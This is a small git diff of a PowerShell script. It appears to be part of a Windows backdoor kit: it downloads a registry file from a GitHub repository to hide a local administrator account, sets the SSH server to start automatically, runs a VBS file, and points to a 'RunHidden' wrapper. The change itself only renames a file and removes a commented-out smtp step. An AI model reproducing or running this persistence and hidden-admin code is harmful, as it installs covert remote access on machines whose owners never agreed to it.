@@ -71,8 +71,6 @@ Remove-Item $configfile
 #goto temp, make working dir
 mkdir $path
 cd $path
-# mv $initial_dir/smtp.txt ./smtp.ps1
-#./smtp.ps1
 
 # registry to hide  local admin
 Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"
@@ -97,7 +95,7 @@ Set-Service -Name sshd -StartupType 'Automatic'
 Get-NetFirewallRule -Name *ssh*
 
 #install the registry
-./wrev.reg; ./calty
+./wrev.reg; ./calty.vbs
 
 # Path to the PowerShell wrapper script
 $runHiddenWrapperPath = "$initial_dir\RunHidden.ps1"
